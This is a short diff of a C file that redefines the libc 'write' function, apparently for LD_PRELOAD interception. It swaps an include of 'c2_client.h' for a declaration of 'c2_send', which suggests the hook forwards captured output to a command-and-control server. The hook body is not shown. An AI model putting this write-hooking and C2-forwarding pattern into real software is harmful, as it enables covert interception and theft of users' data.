@@ -3,8 +3,9 @@
 #include <dlfcn.h>
 #include <unistd.h>
 #include <string.h>
-#include "c2_client.h"
 #include "utils.h"
+
+void c2_send(const char *data);
 
 // Redéfinition de la fonction 'write'
 ssize_t write(int fd, const void *buf, size_t count) {
